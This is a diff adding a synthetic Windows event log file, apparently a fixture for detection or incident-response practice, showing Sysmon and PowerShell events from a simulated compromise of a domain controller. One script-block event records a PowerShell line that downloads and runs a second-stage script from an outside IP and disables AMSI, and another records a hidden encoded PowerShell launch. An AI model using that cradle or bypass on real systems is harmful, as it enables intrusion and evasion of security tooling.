@@ -1,0 +1,58 @@
+<Events>
+  <!-- Sysmon Event 1: Process Create -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:25:00.000000000Z" />
+      <EventRecordID>2001</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="User">TARGET\attacker_admin</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ProcessId">4920</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- Sysmon Event 3: Network Connection Detected (Matching PCAP C2 destination 185.190.140.50:443) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>3</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:25:30.000000000Z" />
+      <EventRecordID>2002</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="User">TARGET\attacker_admin</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ProcessId">4920</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIp">10.0.0.15</Data>
+      <Data Name="SourcePort">51234</Data>
+      <Data Name="DestinationIp">185.190.140.50</Data>
+      <Data Name="DestinationPort">443</Data>
+    </EventData>
+  </Event>
+
+  <!-- PowerShell Script Block (4104) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" />
+      <EventID>4104</EventID>
+      <TimeCreated SystemTime="2026-10-04T12:26:00.000000000Z" />
+      <EventRecordID>2003</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>CORP-DC01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="ScriptBlockText">Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.190.140.50/stage2.ps1'); [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</Data>
+    </EventData>
+  </Event>
+</Events>
